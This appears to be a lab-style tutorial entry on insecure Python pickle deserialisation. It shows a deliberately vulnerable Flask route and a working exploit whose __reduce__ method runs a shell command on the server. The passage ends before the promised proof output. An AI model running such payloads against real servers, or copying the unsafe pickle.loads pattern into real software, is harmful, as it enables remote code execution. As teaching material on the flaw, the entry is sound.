# A08 — Software and Data Integrity Failures (Pickle RCE)

## What it is

Python's pickle module can serialise arbitrary objects, including ones
that execute code on deserialisation via the **reduce** magic method.
Deserialising user-supplied pickle data gives an attacker full remote
code execution with server process permissions.

## Vulnerable code

```python
@app.route("/restore")
def restore():
    data = request.args.get("data", "")
    prefs = pickle.loads(base64.b64decode(data))
    return f"Restored: {prefs}"
```

## Exploit

We craft a Python class whose `__reduce__` returns `os.system` and
a shell command as arguments. When pickled and sent to the server,
`pickle.loads()` calls `os.system(cmd)` automatically.

```python
class RCE:
    def __reduce__(self):
        cmd = "whoami && pwd"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
requests.get(f"{BASE_URL}/restore?data={payload}")
```

Running `python -m exploits.06_pickle_rce`:

## Proof

The Flask server terminal prints:
